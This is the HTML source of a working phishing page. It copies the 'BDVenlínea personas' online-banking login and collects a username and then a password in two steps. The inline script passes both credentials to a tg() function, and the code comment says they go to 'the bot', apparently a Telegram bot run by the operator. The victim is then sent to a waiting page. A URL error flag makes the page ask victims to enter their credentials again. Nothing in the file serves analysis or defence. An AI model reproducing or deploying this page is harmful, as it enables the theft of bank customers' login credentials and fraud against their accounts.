<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BDVenlínea personas</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #f0f0f0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Segoe UI', Arial, sans-serif;
    }
    .card {
      background: #fff;
      border-radius: 16px;
      padding: 40px 32px 36px;
      width: 340px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .logo { width: 180px; margin-bottom: 32px; }
    .field-wrap {
      width: 100%;
      margin-bottom: 14px;
      animation: fadeIn 0.25s ease;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 13px 14px;
      border: none;
      border-bottom: 2px solid #ccc;
      background: #f5f5f5;
      border-radius: 6px 6px 0 0;
      font-size: 15px;
      color: #333;
      outline: none;
      transition: border-color 0.2s;
    }
    input:focus { border-bottom-color: #0057A8; }
    input::placeholder { color: #aaa; }
    .error-msg {
      color: #d32f2f;
      font-size: 13px;
      margin-top: 4px;
      display: none;
      text-align: left;
      width: 100%;
    }
    .btn-entrar {
      width: 100%;
      padding: 13px;
      background: #0057A8;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 18px;
      transition: background 0.2s;
    }
    .btn-entrar:hover { background: #004080; }
    .btn-entrar:disabled { background: #aaa; cursor: not-allowed; }
    .footer-link { margin-top: 18px; font-size: 13px; color: #555; text-align: center; }
    .footer-link a { color: #0057A8; text-decoration: none; }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-6px); }
      to   { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="logo.png" alt="Logo" class="logo" onerror="this.style.display='none'"/>

    <div class="field-wrap" id="campoActivo">
      <input type="text" id="usuario" placeholder="Usuario *" autocomplete="off"/>
    </div>

    <div class="error-msg" id="errorLogin">Usuario o clave incorrectos. Intente nuevamente.</div>

    <button class="btn-entrar" id="btnEntrar" onclick="siguientePaso()">Entrar</button>

    <div class="footer-link">
      ¿Olvidaste tu usuario o clave?<br>
      Si eres nuevo cliente <a href="#">regístrate aquí</a>
    </div>
  </div>

  <script src="tg.js"></script>
  <script>
    // paso 1 = mostrando usuario, paso 2 = mostrando clave
    let paso = 1;
    let usuarioGuardado = '';
    let mostrarError = false;

    window.onload = function() {
      const params = new URLSearchParams(window.location.search);
      mostrarError  = params.get('error') === 'login';

      // Limpiar ?error de la URL de inmediato
      history.replaceState(null, '', window.location.pathname);

      // Siempre arranca en paso 1 (usuario), con o sin error
      paso = 1;
      usuarioGuardado = '';
      sessionStorage.removeItem('bdv_usuario');

      if (mostrarError) {
        document.getElementById('errorLogin').style.display = 'block';
      }

      document.getElementById('usuario').focus();
    };

    async function siguientePaso() {
      if (paso === 1) {
        // ----- PASO 1: recoger usuario -----
        const usuario = document.getElementById('usuario').value.trim();
        if (!usuario) return;

        usuarioGuardado = usuario;
        sessionStorage.setItem('bdv_usuario', usuario);

        // Cambiar campo usuario → clave con animación
        const wrap = document.getElementById('campoActivo');
        wrap.style.animation = 'none';
        void wrap.offsetWidth;
        wrap.style.animation = 'fadeIn 0.25s ease';
        wrap.innerHTML = '<input type="password" id="clave" placeholder="Contraseña *" autocomplete="off"/>';

        // Ocultar error al pasar a clave
        document.getElementById('errorLogin').style.display = 'none';

        document.getElementById('clave').focus();
        paso = 2;

      } else {
        // ----- PASO 2: recoger clave y enviar -----
        const claveEl = document.getElementById('clave');
        if (!claveEl) return;
        const clave = claveEl.value.trim();
        const btn   = document.getElementById('btnEntrar');
        if (!clave) return;

        btn.disabled    = true;
        btn.textContent = 'Verificando...';

        // Enviar usuario + clave juntos al bot
        await tg('login', { usuario: usuarioGuardado, clave });

        sessionStorage.setItem('bdv_contexto', `🔐 Login recibido\n👤 Usuario: \`${usuarioGuardado}\`\n\nSelecciona la acción:`);
        window.location.href = 'wait.html';
      }
    }

    document.addEventListener('keydown', e => {
      if (e.key === 'Enter') siguientePaso();
    });
  </script>
</body>
</html>
